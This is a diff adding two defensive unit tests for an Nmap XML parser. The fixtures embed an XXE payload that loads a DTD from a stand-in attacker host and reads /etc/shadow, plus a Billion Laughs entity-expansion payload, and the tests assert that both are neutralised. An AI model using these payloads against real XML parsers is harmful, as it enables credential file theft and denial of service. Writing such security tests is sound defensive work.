@@ -76,6 +76,64 @@ describe('scanParserUtils', () => {
       expect(parseNmapXml('<root><broken></root>')).toBeNull();
       expect(parseNmapXml('<otherXml></otherXml>')).toBeNull();
     });
+
+    it('neutralizes nested DTD internal subsets and XXE entity definitions without executing or failing', () => {
+      const xxeXml = `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE nmaprun [
+  <!ENTITY % remote SYSTEM "http://10.10.14.5:8000/evil.dtd">
+  <!ENTITY xxe SYSTEM "file:///etc/shadow">
+  <!ENTITY % param1 "<!ENTITY internal 'injected'>">
+  %remote;
+  %param1;
+]>
+<nmaprun scanner="nmap" args="nmap -sV 10.10.10.50" version="7.94">
+  <host>
+    <status state="up"/>
+    <address addr="10.10.10.50" addrtype="ipv4"/>
+    <hostnames><hostname name="hardened.target" type="user"/></hostnames>
+    <ports>
+      <port protocol="tcp" portid="443">
+        <state state="open"/>
+        <service name="https" product="Apache" version="2.4.52"/>
+      </port>
+    </ports>
+  </host>
+</nmaprun>`;
+
+      const result = parseNmapXml(xxeXml);
+      expect(result).not.toBeNull();
+      expect(result?.format).toBe('nmap-xml');
+      expect(result?.detectedIp).toBe('10.10.10.50');
+      expect(result?.detectedHost).toBe('hardened.target');
+      expect(result?.ports).toHaveLength(1);
+      expect(result?.ports[0].port).toBe(443);
+    });
+
+    it('strips multi-line ENTITY declarations and handles Billion Laughs expansion payloads safely', () => {
+      const billionLaughsXml = `<?xml version="1.0"?>
+<!DOCTYPE nmaprun [
+  <!ENTITY lol "lol">
+  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+]>
+<nmaprun scanner="nmap" args="nmap 192.168.1.254" version="7.94">
+  <host>
+    <address addr="192.168.1.254" addrtype="ipv4"/>
+    <ports>
+      <port protocol="tcp" portid="22">
+        <state state="open"/>
+        <service name="ssh"/>
+      </port>
+    </ports>
+  </host>
+</nmaprun>`;
+
+      const result = parseNmapXml(billionLaughsXml);
+      expect(result).not.toBeNull();
+      expect(result?.detectedIp).toBe('192.168.1.254');
+      expect(result?.ports[0].port).toBe(22);
+    });
   });
 
   describe('parseRustscan', () => {
